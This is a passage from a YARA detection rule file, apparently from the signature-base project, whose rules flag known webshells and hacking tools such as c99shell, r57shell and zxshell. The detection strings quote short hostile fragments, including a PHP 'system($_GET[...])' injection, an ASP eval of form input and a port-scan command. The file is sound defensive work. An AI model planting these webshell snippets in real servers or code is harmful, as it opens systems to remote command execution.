		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Usage -- hiderun [AppName]"
		$s7 = "PVAX SW, Alexey A. Popoff, Moscow, 1997."

	condition:
		all of them
}

rule SIGNATURE_BASE_PHP_Shell_V1_7_2
{
	meta:
		description = "Webshells Auto-generated - file PHP_Shell_v1.7.php"
		author = "Florian Roth (Nextron Systems)"
		id = "7eb69ac3-90bb-5a44-8dcd-e71f5edcf18f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8628-L8639"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b5978501c7112584532b4ca6fb77cba5"
		logic_hash = "e03904177309de9ce1afa0b12bf70913b106650c3db5807f9d4ccb91fb2ade77"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s8 = "<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]"

	condition:
		all of them
}

rule SIGNATURE_BASE_Xssshell_Save_2
{
	meta:
		description = "Webshells Auto-generated - file save.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "f33c7559-e2f7-5223-a0e9-4e1d3bc7f080"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8640-L8652"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "865da1b3974e940936fe38e8e1964980"
		logic_hash = "c53034c6ebc4f01c4573e688f548e71dae944913797b12eb8f22a5ef0a368ccf"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "RawCommand = Command & COMMAND_SEPERATOR & Param & COMMAND_SEPERATOR & AttackID"
		$s5 = "VictimID = fm_NStr(Victims(i))"

	condition:
		all of them
}

rule SIGNATURE_BASE_Screencap_2
{
	meta:
		description = "Webshells Auto-generated - file screencap.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "0c1b71d3-ad54-5230-b1ab-971647e76139"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8653-L8666"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "51139091dea7a9418a50f2712ea72aa6"
		logic_hash = "9be7ec97ef8e9b8838f7931a8fcf8d85b1543a202a7bf34fab9791fc47889cb9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "GetDIBColorTable"
		$s1 = "Screen.bmp"
		$s2 = "CreateDCA"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Phpinj_2_2
{
	meta:
		description = "Webshells Auto-generated - file phpinj.php"
		author = "Florian Roth (Nextron Systems)"
		id = "db8f835e-eb13-50f3-a60b-7d8ffcaa5eaa"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8667-L8678"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "dd39d17e9baca0363cc1c3664e608929"
		logic_hash = "12af5182b94f01ac4fbdee92c007556aaa7f196aca116575803cedd84b81f3b0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s9 = "<? system(\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 INTO"

	condition:
		all of them
}

rule SIGNATURE_BASE_Zxshell2_0_Rar_Folder_Zxrecv_2
{
	meta:
		description = "Webshells Auto-generated - file zxrecv.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "9d36541f-dd55-5385-8e2b-598ad78bdf73"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8679-L8696"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "5d3d12a39f41d51341ef4cb7ce69d30f"
		logic_hash = "7eef63e45f6902e4f2d5f854b2794df3101a2ef145e2d627263db429c2b728d7"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "RyFlushBuff"
		$s1 = "teToWideChar^FiYP"
		$s2 = "mdesc+8F D"
		$s3 = "\\von76std"
		$s4 = "5pur+virtul"
		$s5 = "- Kablto io"
		$s6 = "ac#f{lowi8a"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Ajan_3
{
	meta:
		description = "Webshells Auto-generated - file ajan.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "03bf98b9-c8c5-5b9f-b0cd-700c5ed58eac"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8697-L8708"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "22194f8c44524f80254e1b5aec67b03e"
		logic_hash = "a7766caae5845ce43cff2212c25fea9a78979d10c79d8c40290b5c1471b101cd"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "entrika.write \"BinaryStream.SaveToFile"

	condition:
		all of them
}

rule SIGNATURE_BASE_C99Shell_2
{
	meta:
		description = "Webshells Auto-generated - file c99shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8709-L8720"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "90b86a9c63e2cd346fe07cea23fbfc56"
		logic_hash = "a0fcc43a80ac4d059aea36da8b4b5a81c99a54f7c66c521697805ae890d66fe8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<br />Input&nbsp;URL:&nbsp;&lt;input&nbsp;name=\\\"uploadurl\\\"&nbsp;type=\\\"text\\\"&"

	condition:
		all of them
}

rule SIGNATURE_BASE_Phpspy_2005_Full_2
{
	meta:
		description = "Webshells Auto-generated - file phpspy_2005_full.php"
		author = "Florian Roth (Nextron Systems)"
		id = "41a0560a-b22e-5028-8ad1-710c5758cb1d"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8721-L8732"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d1c69bb152645438440e6c903bac16b2"
		logic_hash = "8561161726a49374a9bc3389fef593e5d68dc437552e06736a235412183bef45"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "echo \"  <td align=\\\"center\\\" nowrap valign=\\\"top\\\"><a href=\\\"?downfile=\".urlenco"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Zehir4_2_2
{
	meta:
		description = "Webshells Auto-generated - file zehir4.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "7de89d22-0230-508a-ac50-f61730ad9f4e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8733-L8744"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "5b496a61363d304532bcf52ee21f5d55"
		logic_hash = "bb10f2e28bb375366b9140c06bb242cd13fdb69e67ce72ecae0e50270566f116"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "\"Program Files\\Serv-u\\Serv"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Indexer_2_2
{
	meta:
		description = "Webshells Auto-generated - file indexer.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "8ef79a60-fa8c-51ee-bd87-f5467a66099b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8745-L8756"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "135fc50f85228691b401848caef3be9e"
		logic_hash = "8cf4c8fb1e985adbed2cf20578fcfc14240f6d9fe6062bbe3fe2f895f58bc172"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "<td>Nerden :<td><input type=\"text\" name=\"nerden\" size=25 value=index.html></td>"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop_Devpack_2005_2
{
	meta:
		description = "Webshells Auto-generated - file 2005.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "963effd9-f31d-5238-9419-b5dd11822e56"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8757-L8770"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "63d9fd24fa4d22a41fc5522fc7050f9f"
		logic_hash = "b312cddff4c5292cc51acc39448c815fede3c9356d7d225c3a08c7124712b3f8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "theHref=encodeForUrl(mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\")"
		$s8 = "scrollbar-darkshadow-color:#9C9CD3;"
		$s9 = "scrollbar-face-color:#E4E4F3;"

	condition:
		all of them
}

rule SIGNATURE_BASE__Root_040_Zip_Folder_Deploy_2
{
	meta:
		description = "Webshells Auto-generated - file deploy.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "7e592ab2-8a53-59d5-a45d-971398586479"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8771-L8784"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "2c9f9c58999256c73a5ebdb10a9be269"
		logic_hash = "9852b105e6a28f5500fc6739b196dd14b9b0b69b1077be4063735380b0699abb"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "halon synscan 127.0.0.1 1-65536"
		$s8 = "Obviously you replace the ip address with that of the target."

	condition:
		all of them
}

rule SIGNATURE_BASE_By063Cli_2
{
	meta:
		description = "Webshells Auto-generated - file by063cli.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "9b4a4842-e084-53e8-90fb-603ba034b7df"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8785-L8797"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "49ce26eb97fd13b6d92a5e5d169db859"
		logic_hash = "c89159b73232bc8fd7430b3330009f4b3eb25b9511515bc9b4cd433f7a67f30e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "#popmsghello,are you all right?"
		$s4 = "connect failed,check your network and remote ip."

	condition:
		all of them
}

rule SIGNATURE_BASE_Icyfox007V1_10_Rar_Folder_Asp_2
{
	meta:
		description = "Webshells Auto-generated - file asp.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "52150b6a-2f60-5e6b-86d1-61bc0aeb4fa8"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8798-L8809"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "2c412400b146b7b98d6e7755f7159bb9"
		logic_hash = "3cc36668f0a2a6807b59c7da0b6e504b519a616ab63fb9f606eba5dc4a9e7e2f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<SCRIPT RUNAT=SERVER LANGUAGE=JAVASCRIPT>eval(Request.form('#')+'')</SCRIPT>"

	condition:
		all of them
}

rule SIGNATURE_BASE_Byshell063_Ntboot_2_2
{
	meta:
		description = "Webshells Auto-generated - file ntboot.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "9bcb401d-619b-54b8-be51-f0e3b6eb096c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8811-L8822"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "cb9eb5a6ff327f4d6c46aacbbe9dda9d"
		logic_hash = "25df29000bb410c0ba1fec78920124f6eedbc2585541536239522d2b116270ab"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "OK,job was done,cuz we have localsystem & SE_DEBUG_NAME:)"

	condition:
		all of them
}

rule SIGNATURE_BASE_U_Uay_2
{
	meta:
		description = "Webshells Auto-generated - file uay.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "6a670e19-6e53-5b13-aabf-fe74d48b9113"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8823-L8835"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "abbc7b31a24475e4c5d82fc4c2b8c7c4"
		logic_hash = "45e8938ce34fd5a253cee3867aa8c4429c6bf3fcc91098ed9df3f95656bc5f8f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "exec \"c:\\WINDOWS\\System32\\freecell.exe"
		$s9 = "SYSTEM\\CurrentControlSet\\Services\\uay.sys\\Security"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Bin_Wuaus_2
{
	meta:
		description = "Webshells Auto-generated - file wuaus.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "50b5323b-d8d1-5350-bf93-8dde3d11fd87"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8836-L8852"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "46a365992bec7377b48a2263c49e4e7d"
		logic_hash = "0509ca39662430c3ababf65ca3a6e9af95250163980829d90eddf5341168c864"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "9(90989@9V9^9f9n9v9"
		$s2 = ":(:,:0:4:8:C:H:N:T:Y:_:e:o:y:"
		$s3 = ";(=@=G=O=T=X=\\="
		$s4 = "TCP Send Error!!"
		$s5 = "1\"1;1X1^1e1m1w1~1"
		$s8 = "=$=)=/=<=Y=_=j=p=z="

	condition:
		all of them
}

rule SIGNATURE_BASE_Pwreveal_2
{
	meta:
		description = "Webshells Auto-generated - file pwreveal.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "3d79dd13-9012-56e2-b42a-e6b3e204c601"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8853-L8867"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b4e8447826a45b76ca45ba151a97ad50"
		logic_hash = "01c9582897c65e608d49a151fe9ade97b9a031d7d10f5fd4b4d0c2a3fd83e7b6"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "*<Blank - no es"
		$s3 = "JDiamondCS "
		$s8 = "sword set> [Leith=0 bytes]"
		$s9 = "ION\\System\\Floating-"

	condition:
		all of them
}

rule SIGNATURE_BASE_Shelltools_G0T_Root_Xwhois_2
{
	meta:
		description = "Webshells Auto-generated - file xwhois.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "8f3b3bb2-5884-584a-8220-b6edbfebc8a3"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8868-L8882"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "0bc98bd576c80d921a3460f8be8816b4"
		logic_hash = "75ee56dae5fde75ae4dc4bba835a96016781b747f3cff0dc6d52e665463a6070"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "rting! "
		$s2 = "aTypCog("
		$s5 = "Diamond"
		$s6 = "r)r=rQreryr"

	condition:
		all of them
}

rule SIGNATURE_BASE_Vanquish_2_2
{
	meta:
		description = "Webshells Auto-generated - file vanquish.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "6736cad6-cba1-5b6f-ae05-e2b980280479"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8883-L8894"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "2dcb9055785a2ee01567f52b5a62b071"
		logic_hash = "428dc4e6d8bcc888e6f99f69ee9f211aa029d3486b99b9716d09709dc391d9a2"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "Vanquish - DLL injection failed:"

	condition:
		all of them
}

rule SIGNATURE_BASE_Down_Rar_Folder_Down_2
{
	meta:
		description = "Webshells Auto-generated - file down.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "4e0a0e03-4f01-5b58-807c-0934cdda77ab"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8895-L8906"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "db47d7a12b3584a2e340567178886e71"
		logic_hash = "bc666d6333d49a2b01553e1946fc304195193b9be92e26805474e64da61455da"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "response.write \"<font color=blue size=2>NetBios Name: \\\\\"  & Snet.ComputerName &"

	condition:
		all of them
}

rule SIGNATURE_BASE_Cmdshell_2
{
	meta:
		description = "Webshells Auto-generated - file cmdShell.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "be256fc4-8dc5-58e4-9ca2-5a1df936b8dd"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8907-L8918"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8a9fef43209b5d2d4b81dfbb45182036"
		logic_hash = "5e7c7537b355b162d58b8bce570b1f94a8e6b479856685a245ffaed8f9482680"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "if cmdPath=\"wscriptShell\" then"

	condition:
		all of them
}

rule SIGNATURE_BASE_Zxshell2_0_Rar_Folder_Nc_2
{
	meta:
		description = "Webshells Auto-generated - file nc.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "106209fc-f957-5131-825b-8eb7835625e0"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8919-L8933"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "2cd1bf15ae84c5f6917ddb128827ae8b"
		logic_hash = "6106758aedb33f8983f387a58fcd815c47f793cd2a7ea3b0ebed13dd1d5b6e83"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "WSOCK32.dll"
		$s1 = "?bSUNKNOWNV"
		$s7 = "p@gram Jm6h)"
		$s8 = "ser32.dllCONFP@"

	condition:
		all of them
}

rule SIGNATURE_BASE_Portlessinst_2
{
	meta:
		description = "Webshells Auto-generated - file portlessinst.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "c641c522-7844-5002-8ae7-4aaf60d1337d"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8934-L8947"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "74213856fc61475443a91cd84e2a6c2f"
		logic_hash = "72ca80de2ad2048d1fcbbffeebd0e4fd7d9d47d6736360674e6a85ef9943abe8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "Fail To Open Registry"
		$s3 = "f<-WLEggDr\""
		$s6 = "oMemoryCreateP"

	condition:
		all of them
}

rule SIGNATURE_BASE_Setupbdoor_2
{
	meta:
		description = "Webshells Auto-generated - file SetupBDoor.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "055ff783-fa9f-5037-a3d6-88b58ec1612f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8948-L8959"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "41f89e20398368e742eda4a3b45716b6"
		logic_hash = "b4b6a0e4b9f8975d769d340a420af37dbc344d32c72447a8c56b05e985e6d806"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "\\BDoor\\SetupBDoor"

	condition:
		all of them
}

rule SIGNATURE_BASE_Phpshell_3_2
{
	meta:
		description = "Webshells Auto-generated - file phpshell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "2f0ddfef-b3b5-592b-a9fb-fae4d825d0af"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8960-L8972"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "e8693a2d4a2ffea4df03bb678df3dc6d"
		logic_hash = "b86fa40fd7bbcae86926182882faa226530e44c20bc611b8433a7da7f012106c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p>"
		$s5 = "      echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>\\n\";"

	condition:
		all of them
}

rule SIGNATURE_BASE_BIN_Server_2
{
	meta:
		description = "Webshells Auto-generated - file Server.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "1625b0ee-5f9f-57d8-8333-f175f46d6c59"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8973-L8989"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "1d5aa9cbf1429bb5b8bf600335916dcd"
		logic_hash = "34f9d78e0f61717fae2945e7a833c2c6d59e28035ee95da2c5d32b4e196bc957"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "configserver"
		$s1 = "GetLogicalDrives"
		$s2 = "WinExec"
		$s4 = "fxftest"
		$s5 = "upfileok"
		$s7 = "upfileer"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop2006_Rar_Folder_2006_2
{
	meta:
		description = "Webshells Auto-generated - file 2006.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "bda89055-27f5-50b7-86a3-2c75a5f3eadc"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8990-L9001"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "c19d6f4e069188f19b08fa94d44bc283"
		logic_hash = "536232bbdd21bddb88eefe06a82927abcdd3ed10404c052957896960a6d10932"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "strBackDoor = strBackDoor "

	condition:
		all of them
}

rule SIGNATURE_BASE_R57Shell_3_2
{
	meta:
		description = "Webshells Auto-generated - file r57shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "4129d77c-2981-587b-a83e-8767dc3a48d8"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L9002-L9013"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "87995a49f275b6b75abe2521e03ac2c0"
		logic_hash = "0fdca080c7ce57b7bd818a968840aebf3c5c74f188ed062fec794bfadb4e75b0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<b>\".$_POST['cmd']"

	condition:
		all of them
}

